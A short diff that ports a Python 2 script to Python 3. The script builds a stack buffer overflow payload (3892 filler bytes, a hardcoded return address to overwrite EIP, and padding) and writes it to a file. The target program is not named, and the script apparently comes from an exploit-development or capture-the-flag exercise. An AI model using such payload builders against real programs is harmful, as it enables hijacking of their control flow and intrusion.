@@ -1,13 +1,13 @@
-#!/usr/bin/env python2
- 
+#!/usr/bin/env python3
 
-buff = "A" * 3892
-eip = b"\x2b\x86\x04\x08"
-offset = "C" * 6
+# build the pieces as bytes so we can concatenate cleanly in Python 3
+buff = b"A" * 3892
+eip  = b"\x2b\x86\x04\x08"
+offset = b"C" * 6
 
 buffer = buff + eip + offset
 
-f = open("byte_write.txt", "w")
-f.write(buffer+'\n')
-f.close()
+# write as binary
+with open("byte_write.txt", "wb") as f:
+    f.write(buffer + b"\n")
 
